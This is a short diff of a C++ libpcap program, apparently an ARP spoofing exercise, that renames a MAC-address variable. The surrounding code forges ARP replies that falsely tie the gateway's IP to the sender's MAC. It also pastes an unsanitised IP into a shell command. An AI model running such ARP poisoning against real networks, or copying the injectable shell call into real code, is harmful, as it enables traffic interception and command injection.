@@ -116,9 +116,9 @@ int main(int argc, char* argv[]) {
     string gateway = executeCommand(_gateway.c_str()); 
     cout << gateway << endl;
     string command = "arp -a | grep \""+send_ip+"\" | awk \'{print $4}\'";
-    string target_mac = executeCommand(command.c_str());
+    string sender_mac = executeCommand(command.c_str());
     
-    packet.eth_.dmac_ = Mac(target_mac); // 
+    packet.eth_.dmac_ = Mac(sender_mac); // 
     packet.eth_.smac_ = myMac; // sender's MAC
     packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -129,7 +129,7 @@ int main(int argc, char* argv[]) {
     packet.arp_.op_ = htons(ArpHdr::Reply); 
     packet.arp_.smac_ = myMac; // sender's MAC
     packet.arp_.sip_ = htonl(Ip(gateway)); // IP of Gateway
-    packet.arp_.tmac_ = Mac(target_mac); // MAC of target
+    packet.arp_.tmac_ = Mac(sender_mac); // MAC of target
     packet.arp_.tip_ = htonl(Ip(send_ip));
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
